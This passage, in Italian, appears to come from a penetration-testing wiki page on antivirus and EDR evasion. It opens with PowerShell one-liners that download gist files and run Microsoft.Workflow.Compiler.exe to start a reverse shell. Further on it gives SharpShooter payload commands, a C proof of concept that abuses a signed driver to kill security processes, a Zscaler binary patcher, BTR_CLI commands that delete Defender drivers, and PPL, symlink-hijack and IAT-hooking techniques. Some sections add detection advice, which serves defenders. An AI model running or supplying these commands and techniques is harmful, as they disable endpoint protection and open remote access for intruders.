powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscator C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Uso di Python per creare injector, ad esempio:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disattivare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility console nota come **Antivirus Terminator** per disattivare le protezioni degli endpoint prima di distribuire il ransomware. Lo strumento include un **driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate a livello kernel che nemmeno i servizi AV Protected-Process-Light (PPL) possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file salvato su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La prima riga registra il driver come **servizio kernel** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dallo userland.
3. **IOCTL esposti dal driver**
   | Codice IOCTL | Capacità                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
   | `0x990000D0` | Eliminare un file arbitrario dal disco |
   | `0x990001D0` | Scaricare il driver e rimuovere il servizio |

   Proof-of-concept minimo in C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Perché funziona**: BYOVD aggira completamente le protezioni in user mode; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel, indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
• Abilitare l’elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`), in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.
• Monitorare la creazione di nuovi servizi *kernel* e generare un avviso quando un driver viene caricato da una directory con permessi di scrittura per tutti o non presente nell’elenco degli elementi consentiti.
• Monitorare gli handle in user mode agli oggetti dispositivo personalizzati, seguiti da chiamate `DeviceIoControl` sospette.

### Aggirare i controlli di postura di Zscaler Client Connector tramite patch binarie su disco

**Client Connector** di Zscaler applica localmente le regole di postura del dispositivo e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della postura avviene **interamente lato client** (al server viene inviato un valore booleano).
2. Gli endpoint RPC interni verificano solo che l’eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Applicando patch a quattro binari firmati su disco**, è possibile neutralizzare entrambi i meccanismi:

| Binario | Logica originale modificata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi tutti i controlli risultano conformi |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo, anche non firmato, può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità del tunnel | Bypassati |

Estratto di un patcher minimale:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC delle named pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come sia possibile aggirare le decisioni di trust prese esclusivamente lato client e i semplici controlli delle firme con poche modifiche ai byte.

## Abuso delle funzionalità attendibili di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile controesempio al classico BYOVD. `BTR.sys` è un componente di remediation legittimo e firmato da Microsoft, privo di bug di memory corruption e di un'interfaccia IOCTL; dopo aver ottenuto accesso da amministratore e `SeLoadDriverPrivilege`, un operatore può invece falsificare la sua transazione privata di remediation e ottenere le operazioni previste su file/registro in Ring-0. Si tratta di una **primitiva di neutralizzazione di AV/EDR post-compromissione, non di accesso iniziale o escalation dei privilegi**; il driver può essere estratto dalla risorsa `BOOTTIMETOOL` del `MpEngine.dll` presente sul target stesso, invece di importare un driver di terze parti facilmente riconoscibile.<sup>[[36]](#references)</sup>

### Preparazione del driver monouso

Normalmente Defender salva la risorsa in un file `[a-z]{8}.sys` con nome casuale e registra un servizio kernel con un nome simile. `DriverEntry` legge il valore `Args` del servizio, apre l'ADS NTFS indicato, decritta e convalida l'elenco delle azioni, scrive i dati di feedback e, dopo aver eseguito correttamente le operazioni, restituisce `0xC0000056` (`STATUS_DELETE_PENDING`), così il driver viene scaricato invece di rimanere residente. Un servizio contraffatto presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Lo stream `:changelist` contiene un blob cifrato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la cifratura non costituisce un confine di autorizzazione. Un plaintext valido ha un header globale di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell’header e ID di transazione derivato dal payload), seguito da un percorso feedback UTF-16 terminato da null e da un numero qualsiasi di elementi. Ogni elemento ha un header di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) seguito dai dati specifici dell’azione, che terminano con **esattamente quattro byte NUL**. Ogni regione di header/dati viene verificata indipendentemente con CRC-32, polinomio `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **senza XOR finale** (`~CRC32`); lo stato CRC viene reimpostato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

Gli ID delle azioni accettati espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell’elemento | Risultato |
| --- | --- | --- |
| 1 | `[percorso UTF-16]` | Elimina un file, anche se bloccato |
| 2 | `[percorso UTF-16]` | Rimuove una directory vuota |
| 3 | `[Flags][origine][destinazione]` | Sposta un file in un percorso protetto scelto dall’attaccante; una destinazione vuota comporta l’eliminazione |
| 4 | `[Flags][percorso chiave]` | Elimina ricorsivamente una chiave del registro |
| 5 | `[Flags][percorso chiave + "\\" + valore]` | Elimina un valore del registro |
| 6 | `[Flags][tipo][dimensione][percorso chiave + "\\" + valore][dati]` | Crea/aggiorna un valore del registro e crea i percorsi di chiave mancanti |

Per le azioni 5 e 6, il separatore chiave/valore sul wire è composto da **due backslash consecutivi**; un percorso formattato secondo le convenzioni non verrà suddiviso correttamente. Il file feedback rispecchia per lo più la richiesta, ma i primi quattro byte di dati di ogni elemento diventano il relativo `NTSTATUS`. Per le azioni 1 e 2, che non hanno un campo flags iniziale, BTR sposta il percorso nei quattro byte finali riservati per fare spazio a tale stato.<sup>[[36]](#references)</sup>

### Workflow di `BTR_CLI` e finestra early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l’intera catena: estrae `BTR.sys` da Defender locale, crea `<random>.sys:changelist` e uno stream feedback, serializza e calcola i checksum di azioni concatenate, cifra i dati, crea direttamente la chiave di registro del servizio, quindi chiama `NtLoadDriver` per `-trigger now` oppure lascia il driver come driver con avvio del sistema usando `-trigger boot`. La configurazione diretta del registro evita il normale percorso `CreateServiceW` dell’SCM e quindi **non** genera l’evento Service Install con ID 7045. Gli artefatti attivati all’avvio possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry` prima che lo stack di archiviazione e il link `SystemRoot` siano pronti. `Start=1`, insieme al gruppo ad alta priorità `Boot Bus Extender`, ne determina invece l'esecuzione nella Fase 1: NTFS è utilizzabile, ma molti driver di sicurezza con avvio di sistema e servizi EDR in modalità utente non sono ancora stati inizializzati. I filtri con avvio durante il boot, come `WdFilter`, potrebbero essere già caricati, ma BTR può rimuoverne i binari o la configurazione del servizio prima dell'avvio successivo, ed eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver di avvio e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. La PoC antepone l'Azione 1, relativa al percorso codificato direttamente `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, poi esegue la propria richiesta di eliminazione e lo rimuove prima di scaricarsi. Questo riduce le tracce, mentre inserire il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e i due stream.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni di rilevamento ad alto segnale

Le regole basate solo sulle firme e la blocklist dei driver vulnerabili di Microsoft non contrastano l'abuso delle funzionalità previste di BTR. Preferisci queste correlazioni comportamentali, distinguendo al contempo la legittima provenienza da Defender da un launcher arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è una caratteristica universale dello staging di BTR. Un ADS `.dat` associato allo stesso `.sys` è particolarmente sospetto, poiché Defender di norma inserisce il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correla la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` con `Args=...:changelist` e `Group=Boot Bus Extender`, in assenza di un evento di installazione SCM corrispondente.
- **Sysmon 6 -> 23:** correla il caricamento di un driver BTR noto da una provenienza diversa da Defender con la successiva eliminazione di file attribuita a `System`/PID 4, soprattutto se si tratta di binari di sicurezza.
- **Sysmon 11 -> 23:** genera un alert per la rapida creazione ed eliminazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limita e verifica l'assegnazione e l'attivazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non basta a garantire affidabilità quando un driver di uno strumento di sicurezza viene predisposto da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBIN

Protected Process Light (PPL) applica una gerarchia di firmatari e livelli, in modo che solo i processi protetti con un livello pari o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se riesci ad avviare legittimamente un binario abilitato per PPL e a controllarne gli argomenti, puoi trasformare una funzionalità innocua (ad es. la registrazione dei log) in una primitiva di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa serve perché un processo venga eseguito come PPL
- L'EXE di destinazione (e ogni DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- È necessario richiedere un livello di protezione compatibile con il firmatario del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i firmatari anti-malware, `PROTECTION_LEVEL_WINDOWS` per i firmatari Windows). Un livello errato impedirà la creazione.

Vedi anche qui un'introduzione più ampia a PP/PPL e alla protezione di LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti per il launcher
- Helper open source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Modalità d'uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` avvia un nuovo processo di se stesso e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Se avviato come processo PPL, la scrittura del file avviene con protezione PPL.
- ClipUp non riesce a interpretare percorsi contenenti spazi; usa i percorsi brevi 8.3 per indicare posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad es., CreateProcessAsPPL).
2) Passa l'argomento del percorso del log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad es., Defender Platform). Se necessario, usa i nomi brevi 8.3.
3) Se l'AV tiene normalmente aperto/bloccato il binario di destinazione mentre è in esecuzione (ad es., MsMpEng.exe), pianifica la scrittura all'avvio, prima che l'AV venga avviato, installando un servizio ad avvio automatico che venga eseguito in modo affidabile prima. Verifica l'ordine di avvio con Process Monitor (registrazione all'avvio).
4) Al riavvio, la scrittura protetta da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per motivi di sicurezza):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la posizione; questa primitiva è adatta alla corruzione, non all’iniezione precisa di contenuti.
- Sono necessari privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il timing è fondamentale: il target non deve essere aperto; l’esecuzione all’avvio evita i blocchi dei file.

Rilevamenti
- Creazione di processi `ClipUp.exe` con argomenti insoliti, soprattutto se avviati da launcher non standard, in prossimità dell’avvio.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e che si avviano sistematicamente prima di Defender/AV. Analizza la creazione/modifica dei servizi precedente agli errori di avvio di Defender.
- Monitoraggio dell’integrità dei file dei binari di Defender/delle directory Platform; creazioni/modifiche inattese effettuate da processi con flag di protected process.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e con quali processi parent; blocca l’esecuzione di ClipUp al di fuori dei contesti legittimi.
- Igiene dei servizi: limita la creazione/modifica di servizi con avvio automatico e monitora la manipolazione dell’ordine di avvio.
- Assicurati che la protezione antimanomissione di Defender e le protezioni early-launch siano abilitate; analizza gli errori di avvio che indicano una corruzione dei binari.
- Valuta la possibilità di disabilitare la generazione dei nomi brevi 8.3 nei volumi che ospitano strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

## Tampering di Microsoft Defender tramite Symlink Hijack della cartella Platform Version

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione in ordine lessicografico più alta (ad es., `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione considera attendibili le voci delle directory, compresi i reparse point delle directory (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un percorso scrivibile dall’attaccante e ottenere DLL sideloading o interrompere il servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare il sistema o attivare una nuova selezione della piattaforma Defender (riavvio del servizio all’avvio)
- Sono sufficienti gli strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della piattaforma si fida delle voci delle directory e sceglie la versione lessicograficamente più alta senza verificare che il percorso di destinazione risolva a un percorso protetto/attendibile.

Passo per passo (esempio)
1) Prepara una copia scrivibile della cartella della piattaforma corrente, ad es., `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea all'interno di Platform un symlink di directory con una versione superiore che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale posizione.

Opzioni post-exploitation
- DLL sideloading/esecuzione di codice: rilascia/sostituisci DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedi la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arresto/negazione del servizio: rimuovi il version-symlink, così al successivo avvio il percorso configurato non verrà risolto e Defender non riuscirà ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Nota: questa tecnica non fornisce di per sé privilege escalation; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing con PIC (stile Crystal Kit)

I red team possono spostare l’evasione runtime dall’impianto C2 al modulo bersaglio stesso, eseguendo hooking della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall’attaccante. Questo generalizza l’evasione oltre la ridotta superficie API esposta da molti kit (ad es., CreateProcessA) ed estende le stesse protezioni a BOF e DLL post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio di alto livello
- Caricare uno stub PIC insieme al modulo bersaglio usando un reflective loader (anteposto o companion). Il PIC deve essere autonomo e position-independent.
- Quando la DLL host viene caricata, analizzarne IMAGE_IMPORT_DESCRIPTOR e modificare le voci IAT degli import mirati (ad es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a wrapper PIC essenziali.
- Ogni wrapper PIC esegue le tecniche di evasione prima di effettuare una tail-call all’indirizzo dell’API reale. Le tecniche di evasione tipiche includono:
  - Mascheramento/smascheramento della memoria attorno alla chiamata (ad es., cifrare le regioni del beacon, RWX→RX, modificare i nomi/le autorizzazioni delle pagine), quindi ripristinarle dopo la chiamata.
  - Call-stack spoofing: costruire uno stack benigno e passare all’API bersaglio affinché l’analisi del call stack risolva i frame attesi.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esporre un’interfaccia che consenta a uno script Aggressor (o equivalente) di registrare le API da sottoporre a hooking per Beacon, BOF e DLL post-ex.

Perché usare IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizza l’import sottoposto a hooking, senza modificare il codice dello strumento né affidarsi a Beacon per fare da proxy per API specifiche.
- Copre le DLL post-ex: il hooking di LoadLibrary* consente di intercettare i caricamenti dei moduli (ad es., System.Management.Automation.dll, clr.dll) e applicare lo stesso mascheramento/evasione dello stack alle loro chiamate API.
- Ripristina l’uso affidabile dei comandi post-ex che avviano processi contro i rilevamenti basati sul call stack, eseguendo il wrapping di CreateProcessA/W.

Schema minimale di IAT hook (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocazioni/ASLR e prima del primo utilizzo dell'import. Loader reflective come TitanLdr/AceLdr mostrano l'hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e sicuri per PIC; risolvi la vera API tramite il valore IAT originale acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Per PIC, usa transizioni RW → RX ed evita di lasciare pagine scrivibili ed eseguibili.

Stub di call-stack spoofing
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (indirizzi di ritorno all'interno di moduli benigni) e poi passano alla vera API.
- Questo elude i rilevamenti che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Combina la tecnica con tecniche di stack cutting/stack stitching per arrivare nei frame attesi prima del prologo dell'API.

Integrazione operativa
- Anteponi il loader reflective alle DLL post-ex, così il PIC e gli hook si inizializzano automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target, in modo che Beacon e BOFs possano beneficiare in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni su rilevamento/DFIR
- Integrità IAT: voci che puntano a indirizzi non appartenenti a un'immagine (heap/anonimi); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno che non appartengono a immagini caricate; passaggi improvvisi a PIC non appartenente a un'immagine; genealogia incoerente di RtlUserThreadStart.
- Telemetria del loader: scritture in-process sulla IAT, attività precoce nel DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se viene sottoposto a hooking LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di mascheramento della memoria.

Componenti ed esempi correlati
- Loader reflective che eseguono patching della IAT durante il caricamento (ad es. TitanLdr, AceLdr)
- Hook di memory masking (ad es. simplehook) e PIC per stack cutting (stackcutting)
- Stub PIC per call-stack spoofing (ad es. Draugr)


## Hooking della IAT al momento dell'import + Sleep Obfuscation (Crystal Palace/PICO)

### Hook della IAT al momento dell'import tramite un PICO residente

Se controlli un loader reflective, puoi eseguire l'hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (oggetto PIC persistente) che sopravviva alla liberazione del PIC del loader transitorio.
- Esporta una funzione `setup_hooks()` che sovrascrive il resolver degli import del loader (ad es. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega alla vera `GetProcAddress`.
- Registra i target degli hook al momento del linking con le voci Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook rimane valido perché si trova nel PICO residente.

Questo consente **il reindirizzamento della IAT al momento dell'import** senza patchare la sezione di codice della DLL caricata dopo il caricamento.

### Forzare import intercettabili quando il target usa il PEB-walking

Gli hook al momento dell'import si attivano solo se la funzione è effettivamente presente nella IAT del target. Se un modulo risolve le API tramite un PEB-walk + hash (senza una voce di import), forza un import effettivo affinché il percorso `ProcessImports()` del loader possa intercettarlo:

- Sostituisci la risoluzione degli export tramite hash (ad es. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una voce IAT, consentendo l'intercettazione quando il loader reflective risolve gli import.

### Sleep/idle obfuscation in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, applica l'hooking alle **primitive effettive di attesa/IPC** usate dall'impianto (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, racchiudi la chiamata in una catena di obfuscation in stile Ekko che cifra l'immagine in memoria durante l'inattività:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che invocano `NtContinue` con frame `CONTEXT` appositamente creati.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → cifrala con RC4 tramite `advapi32!SystemFunction032` sull'intera immagine mappata → esegui l'attesa bloccante → decifrala con RC4 → **ripristina i permessi per sezione** scorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un modello `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le attese lunghe (ad es. `WAIT_OBJECT_0`), così il chiamante prosegue mentre l'immagine è mascherata. Questo schema nasconde il modulo agli scanner durante le finestre di inattività ed evita la classica firma di `Sleep()` patchata.

Idee per il rilevamento (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` usata su buffer contigui di grandi dimensioni, pari a un'immagine.
- `VirtualProtect` applicato a un intervallo ampio, seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG in fase di esecuzione per i gadget di sleep-obfuscation

